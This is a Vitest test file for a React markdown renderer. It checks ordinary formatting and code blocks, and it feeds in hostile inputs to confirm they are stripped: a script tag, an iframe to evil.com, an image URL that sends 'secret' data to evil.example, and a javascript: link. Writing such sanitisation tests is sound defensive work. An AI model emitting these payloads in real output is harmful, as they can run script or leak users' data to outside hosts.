// @vitest-environment jsdom
import { act } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { MarkdownRenderer } from './MarkdownRenderer';

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

describe('MarkdownRenderer', () => {
  let container: HTMLDivElement;
  let root: Root;

  beforeEach(() => {
    container = document.createElement('div');
    document.body.appendChild(container);
    root = createRoot(container);
  });

  afterEach(async () => {
    await act(async () => {
      root.unmount();
    });
    container.remove();
  });

  it('renders standard markdown elements safely', async () => {
    const markdown = '# Heading 1\n\nThis is **bold** and _italic_ text with a [link](https://devflow.io).\n\n- Item 1\n- Item 2';
    await act(async () => {
      root.render(<MarkdownRenderer content={markdown} />);
    });

    expect(container.querySelector('h3')?.textContent).toBe('Heading 1');
    expect(container.querySelector('strong')?.textContent).toBe('bold');
    expect(container.querySelector('em')?.textContent).toBe('italic');
    expect(container.querySelector('a')?.getAttribute('href')).toBe('https://devflow.io');
    expect(container.querySelectorAll('li')).toHaveLength(2);
  });

  it('disallows dangerous HTML tags such as script and iframe', async () => {
    const malicious = '<script>alert("hacked")</script><iframe src="https://evil.com"></iframe>Hello safe world';
    await act(async () => {
      root.render(<MarkdownRenderer content={malicious} />);
    });

    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('iframe')).toBeNull();
    expect(container.textContent).toContain('Hello safe world');
  });

  it('does not render images, so an injected answer cannot make the browser fetch a URL', async () => {
    await act(async () => {
      root.render(<MarkdownRenderer content={'![x](https://evil.example/leak?data=secret) after'} />);
    });

    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('evil.example');
    expect(container.textContent).toContain('after');
  });

  it('drops javascript: links', async () => {
    await act(async () => {
      root.render(<MarkdownRenderer content={'[click](javascript:alert(1))'} />);
    });

    expect(container.querySelector('a')?.getAttribute('href') ?? '').not.toContain('javascript');
  });

  it('renders code blocks properly', async () => {
    const code = '```typescript\nconst greeting = "Hello DevFlow";\n```';
    await act(async () => {
      root.render(<MarkdownRenderer content={code} />);
    });

    const codeEl = container.querySelector('code');
    expect(codeEl).not.toBeNull();
    expect(codeEl?.textContent).toContain('const greeting = "Hello DevFlow";');
  });
});
